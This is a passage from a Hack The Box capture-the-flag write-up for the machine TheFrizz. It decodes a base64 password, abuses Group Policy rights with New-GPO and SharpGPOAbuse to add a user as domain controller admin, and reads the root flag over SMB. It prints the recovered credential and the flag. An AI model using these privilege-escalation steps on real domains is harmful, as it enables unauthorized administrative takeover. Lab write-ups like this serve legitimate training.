class="variable">$RE2XMEG</span>.7z</span><br><span class="line"></span><br><span class="line">PS C:\Users\f.frizzle&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">└─$ scp f.frizzle@frizz.htb:c:/users/f.frizzle/stuff.7z .</span><br></pre></td></tr></table></figure></div>
+
+<p>Looking into that file, we find some base64 credentials for M.Schoolbus:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/wapt/conf]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&#x27;IXN1QmNpZ0BNZWhUZWQhUgo=&#x27;</span> | <span class="built_in">base64</span> -d                     </span><br><span class="line">!suBcig@MehTed!R</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we ssh again as that user.</p>
+<p>Hint: This new user has a bunch of abilities, but only one directly applies to the DC:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\M.SchoolBus&gt; get-domain</span><br><span class="line"></span><br><span class="line">Forest                  : frizz.htb</span><br><span class="line">DomainControllers       : &#123;frizzdc.frizz.htb&#125;</span><br><span class="line">Children                : &#123;&#125;</span><br><span class="line">DomainMode              : Unknown</span><br><span class="line">DomainModeLevel         : 7</span><br><span class="line">Parent                  : </span><br><span class="line">PdcRoleOwner            : frizzdc.frizz.htb</span><br><span class="line">RidRoleOwner            : frizzdc.frizz.htb</span><br><span class="line">InfrastructureRoleOwner : frizzdc.frizz.htb</span><br><span class="line">Name                    : frizz.htb</span><br><span class="line"></span><br><span class="line">PS C:\Users\M.SchoolBus&gt; Get-DomainOU | <span class="keyword">select</span> name, gplink</span><br><span class="line"></span><br><span class="line">name               gplink</span><br><span class="line">----               ------</span><br><span class="line">Domain Controllers [LDAP://CN=&#123;6AC1786C-016F-11D2-945F-00C04fB984F9&#125;,CN=Policies,CN=System,DC=frizz,DC=htb;0]</span><br><span class="line">Class_Frizz</span><br></pre></td></tr></table></figure></div>
+
+<p>We can use privs to create a new GPO and then link it to the OU:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\M.SchoolBus&gt; New-GPO -Name kujen | New-GPLink -Target <span class="string">&quot;OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB&quot;</span> -LinkEnabled Yes</span><br><span class="line"></span><br><span class="line">GpoId       : 3b236518-30ed-4ea2-821b-90b0f32d1be7</span><br><span class="line">DisplayName : kujen</span><br><span class="line">Enabled     : True</span><br><span class="line">Enforced    : False</span><br><span class="line">Target      : OU=Domain Controllers,DC=frizz,DC=htb</span><br><span class="line">Order       : 2</span><br><span class="line"></span><br><span class="line">PS C:\Users\M.SchoolBus&gt; .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName kujen</span><br><span class="line">[+] Domain = frizz.htb</span><br><span class="line">[+] Domain Controller = frizzdc.frizz.htb</span><br><span class="line">[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb</span><br><span class="line">[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106</span><br><span class="line">[+] GUID of <span class="string">&quot;kujen&quot;</span> is: &#123;3B236518-30ED-4EA2-821B-90B0F32D1BE7&#125;</span><br><span class="line">[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\&#123;3B236518-30ED-4EA2-821B-90B0F32D1BE7&#125;\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf</span><br><span class="line">[+] versionNumber attribute changed successfully</span><br><span class="line">[+] The version number <span class="keyword">in</span> GPT.ini was increased successfully.</span><br><span class="line">[+] The GPO was modified to include a new <span class="built_in">local</span> admin. Wait <span class="keyword">for</span> the GPO refresh cycle.</span><br><span class="line">[+] Done!</span><br><span class="line">PS C:\Users\M.SchoolBus&gt; gpupdate /force</span><br><span class="line">Updating policy...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Computer Policy update has completed successfully.</span><br><span class="line"></span><br><span class="line">User Policy update has completed successfully.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\M.SchoolBus&gt; net localgroup administrators</span><br><span class="line">Alias name     administrators</span><br><span class="line">Comment        Administrators have complete and unrestricted access to the computer/domain</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">M.SchoolBus</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure></div>
+
+<p>And we are local admin now!</p>
+<p>Lets get our flags:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">                                                                                                                                                                                                     </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/wapt/conf]</span><br><span class="line">└─$ smbclient  //frizzdc.frizz.htb/C$ -U M.SchoolBus -p <span class="string">&#x27;!suBcig@MehTed!R&#x27;</span></span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\M.SchoolBus]:</span><br><span class="line">                                                                                                                                                                                                     </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/wapt/conf]</span><br><span class="line">└─$ smbclient  //frizzdc.frizz.htb/C$ -U M.SchoolBus                      </span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\M.SchoolBus]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  <span class="variable">$RECYCLE</span>.BIN                      DHS        0  Tue Oct 29 14:31:09 2024</span><br><span class="line">  <span class="variable">$WinREAgent</span>                        DH        0  Mon Mar 10 22:31:22 2025</span><br><span class="line">  Config.Msi                        DHS        0  Thu Feb 20 22:51:26 2025</span><br><span class="line">  Documents and Settings          DHSrn        0  Tue Oct 29 16:12:57 2024</span><br><span class="line">  DumpStack.log.tmp                 AHS    12288  Tue Oct 29 15:27:08 2024</span><br><span class="line">  inetpub                             D        0  Mon Mar 10 22:39:34 2025</span><br><span class="line">  PerfLogs                            D        0  Sat May  8 08:15:05 2021</span><br><span class="line">  Program Files                      DR        0  Wed Feb 26 16:13:49 2025</span><br><span class="line">  Program Files (x86)                 D        0  Sat May  8 09:34:13 2021</span><br><span class="line">  ProgramData                       DHn        0  Thu Feb 20 22:50:40 2025</span><br><span class="line">  Recovery                         DHSn        0  Tue Oct 29 16:12:59 2024</span><br><span class="line">  System Volume Information         DHS        0  Tue Oct 29 14:25:07 2024</span><br><span class="line">  Users                              DR        0  Tue Oct 29 14:31:03 2024</span><br><span class="line">  Windows                             D        0  Mon Mar 10 22:41:41 2025</span><br><span class="line">  xampp                               D        0  Tue Oct 29 14:28:30 2024</span><br><span class="line"></span><br><span class="line">                3769343 blocks of size 4096. 366469 blocks available</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> <span class="built_in">users</span></span><br><span class="line">smb: \<span class="built_in">users</span>\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                  DR        0  Tue Oct 29 14:31:03 2024</span><br><span class="line">  ..                                DHS        0  Mon Mar 10 22:39:34 2025</span><br><span class="line">  Administrator                       D        0  Tue Mar 11 22:37:09 2025</span><br><span class="line">  All Users                       DHSrn        0  Sat May  8 08:26:16 2021</span><br><span class="line">  Default                           DHR        0  Tue Oct 29 16:12:57 2024</span><br><span class="line">  Default User                    DHSrn        0  Sat May  8 08:26:16 2021</span><br><span class="line">  desktop.ini                       AHS      174  Sat May  8 08:14:03 2021</span><br><span class="line">  f.frizzle                           D        0  Sat Mar 22 18:24:37 2025</span><br><span class="line">  M.SchoolBus                         D        0  Sat Mar 22 19:04:40 2025</span><br><span class="line">  Public                             DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  v.frizzle                           D        0  Wed Feb 19 21:35:08 2025</span><br><span class="line">  w.Webservice                        D        0  Wed Feb 19 21:35:08 2025</span><br><span class="line"></span><br><span class="line">                3769343 blocks of size 4096. 366469 blocks available</span><br><span class="line">smb: \<span class="built_in">users</span>\&gt; <span class="built_in">cd</span> administrator</span><br><span class="line">smb: \<span class="built_in">users</span>\administrator\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Mar 11 22:37:09 2025</span><br><span class="line">  ..                                 DR        0  Tue Oct 29 14:31:03 2024</span><br><span class="line">  3D Objects                         DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  AppData                            DH        0  Fri Mar 21 22:26:23 2025</span><br><span class="line">  Application Data                DHSrn        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  Contacts                           DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  Cookies                         DHSrn        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  Desktop                            DR        0  Wed Feb 26 21:53:05 2025</span><br><span class="line">  Documents                          DR        0  Wed Feb 26 16:13:49 2025</span><br><span class="line">  Downloads                          DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  Favorites                          DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  Links                              DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  Local Settings                  DHSrn        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  Music                              DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  My Documents                    DHSrn        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  NetHood                         DHSrn        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  NTUSER.DAT                        AHn   262144  Fri Mar 21 22:26:29 2025</span><br><span class="line">  ntuser.dat.LOG1                   AHS        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  ntuser.dat.LOG2                   AHS    99328  Tue Oct 29 14:13:18 2024</span><br><span class="line">  NTUSER.DAT&#123;a220b2e4-9610-11ef-9ff5-0800273d0e9f&#125;.TM.blf    AHS    65536  Tue Oct 29 14:13:18 2024</span><br><span class="line">  NTUSER.DAT&#123;a220b2e4-9610-11ef-9ff5-0800273d0e9f&#125;.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Oct 29 14:13:18 2024</span><br><span class="line">  NTUSER.DAT&#123;a220b2e4-9610-11ef-9ff5-0800273d0e9f&#125;.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Oct 29 14:13:18 2024</span><br><span class="line">  ntuser.ini                         HS       20  Tue Oct 29 14:13:18 2024</span><br><span class="line">  Pictures                           DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  Recent                          DHSrn        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  Saved Games                        DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  Searches                           DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line">  SendTo                          DHSrn        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  Start Menu                      DHSrn        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  Templates                       DHSrn        0  Tue Oct 29 14:13:18 2024</span><br><span class="line">  Videos                             DR        0  Tue Oct 29 14:13:24 2024</span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">                3769343 blocks of size 4096. 366469 blocks available</span><br><span class="line">smb: \<span class="built_in">users</span>\administrator\&gt; <span class="built_in">cd</span> desktop</span><br><span class="line">smb: \<span class="built_in">users</span>\administrator\desktop\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                  DR        0  Tue Mar 11 23:14:03 2025</span><br><span class="line">  ..                                  D        0  Tue Mar 11 22:37:09 2025</span><br><span class="line">  cleanup.ps1                         A     2083  Tue Feb 25 22:06:47 2025</span><br><span class="line">  desktop.ini                       AHS      282  Tue Oct 29 14:13:24 2024</span><br><span class="line">  root.txt                           AR       34  Fri Mar 21 22:26:26 2025</span><br><span class="line"></span><br><span class="line">                3769343 blocks of size 4096. 366469 blocks available</span><br><span class="line">smb: \<span class="built_in">users</span>\administrator\desktop\&gt; <span class="built_in">cat</span> root.txt</span><br><span class="line"><span class="built_in">cat</span>: <span class="built_in">command</span> not found</span><br><span class="line">smb: \<span class="built_in">users</span>\administrator\desktop\&gt; get root.txt</span><br><span class="line">getting file \<span class="built_in">users</span>\administrator\desktop\root.txt of size 34 as root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br><span class="line">smb: \<span class="built_in">users</span>\administrator\desktop\&gt; <span class="built_in">exit</span></span><br><span class="line">                                                                                                                                                                                                     </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop/wapt/conf]</span><br><span class="line">└─$ <span class="built_in">cat</span> root.txt                             </span><br><span class="line">d675dc327c0a22d4c5f82b5c378276bd</span><br></pre></td></tr></table></figure></div>
+
+<p>That was it for TheFrizz, I hope you learned something new!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: TheFrizz</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-08-20 22:45:24</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-08-20 23:34:18
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/08/20/Hackthebox-TheFrizz/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/08/16/Hackthebox-Nocturnal/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Nocturnal</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: TheFrizz</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Application-http-frizzdc-frizz-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;frizzdc.frizz.htb </span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
